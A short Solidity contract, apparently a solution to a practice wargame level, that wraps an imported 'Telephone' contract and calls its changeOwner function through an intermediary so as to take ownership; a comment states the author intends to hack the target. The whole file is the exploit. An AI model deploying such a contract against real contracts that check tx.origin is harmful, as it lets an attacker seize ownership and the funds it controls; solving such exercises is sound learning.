// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

// I have imported the contract that I intend to hack
import "./Telephone.sol";

contract Tap {
    
    Telephone tapTelephone;
    
    constructor(address _address) public {
        tapTelephone = Telephone(_address);
    }
    function TelephoneTap(address _address) public {
        tapTelephone.changeOwner(_address);
    }
}
